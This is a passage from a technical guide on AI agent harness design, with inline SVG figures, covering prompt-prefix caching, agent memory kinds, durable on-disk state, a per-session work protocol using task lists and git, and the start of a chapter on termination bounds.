<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#1a1a2e" text-anchor="start" font-weight="700">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">The prefix repeats on every turn, so cache it</text>
<text x="455.0" y="106.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">system</text>
<text x="530.0" y="106.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">tools</text>
<text x="595.0" y="106.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">memory</text>
<text x="665.0" y="106.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">conversation</text>
<text x="730.0" y="106.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">retrieval</text>
<text x="316.0" y="123.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">Turn 1</text>
<rect x="420.0" y="112.0" width="68.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="490.0" y="112.0" width="78.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="570.0" y="112.0" width="48.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="620.0" y="112.0" width="28.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="710.0" y="112.0" width="38.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<text x="760.0" y="123.0" font-size="9" fill="#6b7a90" text-anchor="start" font-weight="600">computed, cache written</text>
<text x="316.0" y="143.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">Turn 2</text>
<rect x="420.0" y="132.0" width="68.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="490.0" y="132.0" width="78.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="570.0" y="132.0" width="48.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="620.0" y="132.0" width="28.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="650.0" y="132.0" width="28.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="710.0" y="132.0" width="38.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<text x="760.0" y="143.0" font-size="9" fill="#1e7e34" text-anchor="start" font-weight="600">prefix hit</text>
<text x="316.0" y="163.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">Turn 3</text>
<rect x="420.0" y="152.0" width="68.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="490.0" y="152.0" width="78.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="570.0" y="152.0" width="48.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="620.0" y="152.0" width="58.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="680.0" y="152.0" width="28.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="710.0" y="152.0" width="38.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<text x="760.0" y="163.0" font-size="9" fill="#1e7e34" text-anchor="start" font-weight="600">longer prefix hit</text>
<text x="316.0" y="183.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">After compaction</text>
<rect x="420.0" y="172.0" width="68.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="490.0" y="172.0" width="78.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="570.0" y="172.0" width="48.5" height="14.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<rect x="620.0" y="172.0" width="43.5" height="14.0" rx="2" fill="#de350b" stroke="none" stroke-width="1.2"/>
<rect x="710.0" y="172.0" width="38.5" height="14.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<text x="760.0" y="183.0" font-size="9" fill="#de350b" text-anchor="start" font-weight="600">miss after the rewrite</text>
<text x="316.0" y="213.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">Timestamp in prompt</text>
<rect x="420.0" y="202.0" width="68.5" height="14.0" rx="2" fill="#de350b" stroke="none" stroke-width="1.2"/>
<rect x="490.0" y="202.0" width="78.5" height="14.0" rx="2" fill="#de350b" stroke="none" stroke-width="1.2"/>
<rect x="570.0" y="202.0" width="48.5" height="14.0" rx="2" fill="#de350b" stroke="none" stroke-width="1.2"/>
<rect x="620.0" y="202.0" width="58.5" height="14.0" rx="2" fill="#de350b" stroke="none" stroke-width="1.2"/>
<rect x="710.0" y="202.0" width="38.5" height="14.0" rx="2" fill="#de350b" stroke="none" stroke-width="1.2"/>
<text x="760.0" y="213.0" font-size="9" fill="#de350b" text-anchor="start" font-weight="600">miss on every turn</text>
<rect x="420.0" y="232.0" width="12.0" height="10.0" rx="2" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<text x="436.0" y="241.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">cache hit</text>
<rect x="516.0" y="232.0" width="12.0" height="10.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<text x="532.0" y="241.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">computed</text>
<rect x="612.0" y="232.0" width="12.0" height="10.0" rx="2" fill="#de350b" stroke="none" stroke-width="1.2"/>
<text x="628.0" y="241.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">cache miss</text>
</svg>
</div>

A cache hit requires an exact prefix match, and four common mistakes break it. A timestamp or random ID in the system prompt breaks it. Tool definitions reordered between turns break it. Retrieved content placed before the static prompt breaks it. History rewritten in place breaks everything after the edit point. Order the context from most stable to least stable: the system prompt, the tool definitions, long-lived memory, the conversation, and then this turn's retrieval. That order decides how much of each request is cacheable at all.

Compaction and caching conflict. Compaction rewrites history, which destroys the cached prefix, so the turn after a compaction is expensive. Compact rarely and in large batches so that you pay the miss once. Where the provider offers server-side compaction, use it, because the provider keeps its own cache consistent.

Supporting frameworks: Strands (A.1), Pi (A.4), OpenAI (A.6).

---

## 6. Memory, durable state, and the session protocol

Memory is an overloaded word. Inside agent harnesses it splits into four useful kinds.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c6-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c6-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c6-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c6-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c6-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c6-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#FF9900"/>
<text x="55.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Plan</text>
<path d="M50.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#FF9900"/>
<text x="169.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Specify</text>
<path d="M164.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#edf0f4"/>
<text x="397.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Test</text>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#edf0f4"/>
<text x="511.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Verify</text>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#edf0f4"/>
<text x="625.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Deploy</text>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#edf0f4"/>
<text x="853.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Operate</text>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c6-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M195.1 178.5 L292 64 L292 252 L195.1 178.5 Z" fill="#FF9900" opacity="0.10"/>
<line x1="195.1" y1="178.5" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="195.1" y1="178.5" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#1a1a2e" text-anchor="start" font-weight="700">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">The window resets every session, and the repository carries the work</text>
<text x="316.0" y="104.0" font-size="8" fill="#6b7a90" text-anchor="start" font-weight="700">CONTEXT WINDOW, DISCARDED AT EXIT</text>
<rect x="316.0" y="110.0" width="176.0" height="24.0" rx="6" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="404.0" y="126.0" font-size="9.5" fill="#ffffff" text-anchor="middle" font-weight="600">Session 1</text>
<rect x="506.0" y="110.0" width="200.0" height="24.0" rx="6" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<rect x="720.0" y="110.0" width="176.0" height="24.0" rx="6" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="808.0" y="126.0" font-size="9.5" fill="#ffffff" text-anchor="middle" font-weight="600">Session 3</text>
<circle cx="524.0" cy="122" r="7" fill="#ffffff"/>
<text x="524.0" y="125.5" font-size="8.5" fill="#0052CC" text-anchor="middle" font-weight="700">1</text>
<circle cx="547.4" cy="122" r="7" fill="#ffffff"/>
<text x="547.4" y="125.5" font-size="8.5" fill="#0052CC" text-anchor="middle" font-weight="700">2</text>
<circle cx="570.8" cy="122" r="7" fill="#FF9900"/>
<text x="570.8" y="125.5" font-size="8.5" fill="#232F3E" text-anchor="middle" font-weight="700">3</text>
<circle cx="594.2" cy="122" r="7" fill="#ffffff"/>
<text x="594.2" y="125.5" font-size="8.5" fill="#0052CC" text-anchor="middle" font-weight="700">4</text>
<circle cx="617.6" cy="122" r="7" fill="#ffffff"/>
<text x="617.6" y="125.5" font-size="8.5" fill="#0052CC" text-anchor="middle" font-weight="700">5</text>
<circle cx="641.0" cy="122" r="7" fill="#ffffff"/>
<text x="641.0" y="125.5" font-size="8.5" fill="#0052CC" text-anchor="middle" font-weight="700">6</text>
<circle cx="664.4" cy="122" r="7" fill="#ffffff"/>
<text x="664.4" y="125.5" font-size="8.5" fill="#0052CC" text-anchor="middle" font-weight="700">7</text>
<circle cx="687.8" cy="122" r="7" fill="#ffffff"/>
<text x="687.8" y="125.5" font-size="8.5" fill="#0052CC" text-anchor="middle" font-weight="700">8</text>
<text x="606.0" y="150.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">eight steps, baseline test at step 3</text>
<rect x="316.0" y="188.0" width="580.0" height="50.0" rx="6" fill="#232F3E" stroke="none" stroke-width="1.2"/>
<text x="330.0" y="208.0" font-size="10.5" fill="#ffffff" text-anchor="start" font-weight="700">Repository and disk</text>
<text x="330.0" y="223.0" font-size="8.5" fill="#c9d2de" text-anchor="start" font-weight="normal">persists across sessions</text>
<rect x="470.0" y="203.0" width="72.0" height="20.0" rx="10" fill="#34465c" stroke="#5a6b82" stroke-width="1.2"/>
<text x="506.0" y="216.5" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="normal" font-family="SFMono-Regular, Menlo, Consolas, monospace">tasks.json</text>
<rect x="550.0" y="203.0" width="96.0" height="20.0" rx="10" fill="#34465c" stroke="#5a6b82" stroke-width="1.2"/>
<text x="598.0" y="216.5" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="normal">progress notes</text>
<rect x="654.0" y="203.0" width="44.0" height="20.0" rx="10" fill="#34465c" stroke="#5a6b82" stroke-width="1.2"/>
<text x="676.0" y="216.5" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="normal">spec</text>
<rect x="706.0" y="203.0" width="84.0" height="20.0" rx="10" fill="#34465c" stroke="#5a6b82" stroke-width="1.2"/>
<text x="748.0" y="216.5" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="normal">setup script</text>
<rect x="798.0" y="203.0" width="78.0" height="20.0" rx="10" fill="#34465c" stroke="#5a6b82" stroke-width="1.2"/>
<text x="837.0" y="216.5" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="normal">git history</text>
<line x1="330.0" y1="186.0" x2="330.0" y2="137.0" stroke="#0052CC" stroke-width="1.4" marker-end="url(#c6-b)"/>
<line x1="478.0" y1="137.0" x2="478.0" y2="186.0" stroke="#FF9900" stroke-width="1.4" marker-end="url(#c6-o)"/>
<line x1="520.0" y1="186.0" x2="520.0" y2="137.0" stroke="#0052CC" stroke-width="1.4" marker-end="url(#c6-b)"/>
<line x1="692.0" y1="137.0" x2="692.0" y2="186.0" stroke="#FF9900" stroke-width="1.4" marker-end="url(#c6-o)"/>
<line x1="734.0" y1="186.0" x2="734.0" y2="137.0" stroke="#0052CC" stroke-width="1.4" marker-end="url(#c6-b)"/>
<line x1="882.0" y1="137.0" x2="882.0" y2="186.0" stroke="#FF9900" stroke-width="1.4" marker-end="url(#c6-o)"/>
<text x="336.0" y="166.0" font-size="8.5" fill="#0052CC" text-anchor="start" font-weight="600">reads</text>
<text x="474.0" y="166.0" font-size="8.5" fill="#9a5b00" text-anchor="end" font-weight="600">writes</text>
</svg>
</div>

| Kind                   | Lifetime             | Example                                                 |
| ---------------------- | -------------------- | ------------------------------------------------------- |
| Working                | Current turn         | The current tool call and its result                    |
| Session                | Current conversation | The whole task, from prompt to completion               |
| Episodic               | Across sessions      | "Last Tuesday you fixed a similar bug in `parser.py`"   |
| Semantic or procedural | Permanent            | Coding conventions, project structure, user preferences |

Most harnesses handle working and session memory, because both are the conversation buffer. Fewer handle episodic memory, which is what lets an agent improve on a codebase over time. The usual mechanism is a project instruction file that every session reads, such as `AGENTS.md`, plus a store of corrections that the agent writes back.

### 6.1 The one question that matters

Ask one question of any memory design: can the user read it and edit it?

Opaque memory that only the agent reads and writes accumulates wrong beliefs and is hard to debug. File-backed memory carries a second advantage, which is that it survives a process restart, a machine reboot, and a framework upgrade, because it is a file.

### 6.2 The repository is the system of record

Anything the agent cannot reach in context does not exist for the agent. The rest of this chapter and chapter 13 build on this rule.

A decision made in a chat thread, an architectural pattern that lives in one engineer's head, and product context that only the product manager knows are all invisible to the agent. Push them into the repository, because the repository is the only thing every session reliably sees. A decision that nobody writes down is a decision that the agent never learns.

### 6.3 Keep the instruction file a map, not an encyclopedia

`AGENTS.md` and its equivalents grow without limit unless someone prunes them. Keep the top-level file short, somewhere near 100 lines, and use it as a table of contents pointing into a structured `docs/` directory.

Two failure modes drive the rule. A long instruction file crowds out the actual task, and it also rots, because nobody reviews hundreds of lines of accumulated advice. The structure you want is progressive disclosure again, where the agent starts from a small stable entry point and learns where to look for depth.

### 6.4 Durable state on disk

The context window lasts for one session, so anything that must outlive a session goes to disk. Section 6.2 gave the principle, and five artifacts carry it out.

| Artifact              | Format    | Purpose                                                                    |
| --------------------- | --------- | -------------------------------------------------------------------------- |
| Task list             | JSON      | The single source of truth for what is done and what remains               |
| Progress notes        | Free text | What happened last session, bugs found, decisions made, what is next       |
| Plan or specification | Markdown  | The original requirements, kept in the project directory                   |
| Setup script          | Shell     | Automates environment setup so the agent spends no context on installation |
| Git history           | Commits   | Descriptive commits that let the agent reconstruct what changed            |

The format of the task list is a real decision. A markdown checklist invites the model to rewrite, reorder, and quietly drop items, and JSON with a fixed schema resists that. Add two rules and enforce them in code where you can: never remove or reorder an item, and only flip a status from incomplete to complete. The agent then reports against the task list instead of editing it. The setup script matters for a less obvious reason. Without it, every session spends hundreds of tokens working out how to install dependencies and start a server. With it, that cost is one tool call.

### 6.5 The session protocol

Every session follows the same protocol, because a predictable session is a recoverable one. The session orients by reading the progress notes, the task list, and recent git history. It runs the setup script, and it tests that existing behavior still works before it touches anything new. It then picks the single highest-priority incomplete task, implements it, and tests it through the real interface. It closes by marking the task complete, committing with a descriptive message, writing progress notes, and leaving the application in a working state. The baseline test is the step teams skip, and the cost of skipping it compounds without a signal. A previous session can leave a broken build, and a session that builds on top of it produces two failures that nobody can attribute.

One task per session keeps the context from running out, keeps the session focused, and makes failure cheap, because a failed session loses one task instead of six. Treat it as a dial. Relax it as the agent proves reliable, and tighten it the moment quality drops.

Use git to make every session recoverable. Commit after every completed task and tag known-good states. When a session leaves the codebase broken, you choose between a hard reset to the last tag followed by a re-run, and prompts that rescue the current state. Both are legitimate, and the tag is what gives you the choice. Last, regenerate the task list periodically by having the agent compare the codebase against the specification. The codebase and the requirements drift, and an agent follows a stale plan with full confidence.

### 6.6 Session resumption

Session memory that outlives the process needs a session identifier and somewhere to put state. Resuming a session means loading its history, its offloaded artifacts, and its working state by that identifier, and a workspace snapshot does the same for files. If your agent runs for hours you need this. If it runs for a minute you do not.

Supporting frameworks: Strands (A.1), AgentCore (A.2), KiroCrew (A.3), Pi (A.4), LangChain (A.5), OpenAI (A.6).

---

## 7. Termination and bounds

Decide how the loop ends, and what a run can consume, before you ship the agent.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c7-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c7-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c7-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c7-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c7-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c7-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#edf0f4"/>
<text x="55.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Plan</text>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#edf0f4"/>
<text x="169.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Specify</text>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#edf0f4"/>
<text x="397.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Test</text>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#edf0f4"/>
<text x="511.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Verify</text>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#FF9900"/>
<text x="625.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Deploy</text>
<path d="M620.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#edf0f4"/>
<text x="853.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Operate</text>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c7-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
